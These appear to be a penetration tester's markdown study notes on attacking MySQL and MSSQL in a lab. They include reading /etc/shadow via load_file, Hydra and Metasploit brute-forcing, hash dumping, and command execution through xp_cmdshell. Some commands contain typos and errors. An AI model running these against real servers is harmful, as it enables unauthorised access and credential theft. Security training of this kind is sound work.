# Table of Contents
1. [Overview](#Overview)
	1. Ports
	3. Usage
	4. Related Services
2. [Tools](#Tools)

---
# Overview 

SQL - Simple Query Language

Relational database that is used by a lot of websites to store data.

---
## #Ports
- 3306 : mysql
- 1433 : MSSQL

## Usage
`mysql -h 192.168.34.3 -u root`
- `show database;` : shows databases
- `use books;` : go in to database
- `select count * from authors;` : show authors
- `help;` : help menu
- `select load_file("/etc/shadow");` : can see dir access by user from msfconsole mysql_writable_dirs

## Related Services
- MySql : database
- PostgreSql : database
- MariaDB : database
- MSSql : Microsoft SQL

---
# #Tools

## Hydra
dictionary attack
```bash
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_password.txt 192.168.45.3 mysql
```

## msfconsole
### MSQL
- use auxiliary/scanner/mysql/mysql_writable_dirs
	- set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
	- setg rhosts 192.168.34.2
		- setg : set globaly
	- set verbose false
	- advanced : advanced options
	- set password "" : null password
	- run
- use auxiliary/scanner/mysql/mysql_hashdump
	- set username root
	- set password "" : doesn't show in options
	- run
	- gives user hashes
- use auxiliary/scanner/mysql/mysql_login
	- set rhost addr
	- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_password.txt
	- set stop_on_success true
	- set username root
	- run
### MSSQL
- use auxiliary/scanner/mssql/mssql_login
	- setg rhosts addr
	- set user_file /root/desktop/wordlists/common_users.txt
	- set pass_file /root/dektop/wordlists/100-common-passwords.txt
	- run
- use auxiliary/admin/mssql/mssql_enum
	- run
- use auxiliary/admin/mssql/mssql_enum_sql_logins
- use auxiliary/admin/mssql/mssql_exec
	- set cmd whoami
	- set username sa ???
- use auxiliary/admin/mssql/mssql_enum_domain_accounts
	- run

---
## nmap
### MSQL
- --script
	- mysql-empty-password
		- show users with no pass
	- mysql-info
		- shows capabilities and other info
	- mysql-users
		- --script-args="mysqluser='root',mysqlpass=''"
	- mysql-databases
		- --script-args="mysqluser='root',mysqlpass=''"
	- mysql-variables
		- --script-args="mysqluser='root',mysqlpass=''"
		- look for **datadir:** locations
	- mysql-audit
		- --script-args="mysql-audit.username='root',mysql-audit.password='', mysql-audit.filename='usr/share/nmap/nselib/data/mysql-cis.audit"
	- mysqldump-hashes
		- --script-args="username='root',password=''"
	- mysql-query
		- --script-args="query='select count(\*) from books',username='root',password=''"
### MSSQL
- --script
	- ms-sql-info
		- information
	- ms-sql-ntlm-info
		- `--script-args instance-port=1433`
		- version info
	- ms-sql-brute 
		- ` --script-args userdb=/usr/wordlists/common_users.txt,passdb=/usr/wordlists/100-common-passwords.txt`
	- ms-sql-empty-password
	- ms-query
		- `-script-args mssql.username-admin,mssql.password=anamaria,ms-sql.query.query='SELECT * FROM master..syslogins' -oN output.txt`
	- ms-sql-dump-hashes 
		- `--script-args mssql.username=admin,mssql.password=anamaria`
	- ms-sql-xp-cmdshell 
		- `--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"`
			- `ms-sql-xp-cmshell.cm="type c:\flag.txt"`
				- type is windows version of cat
	- 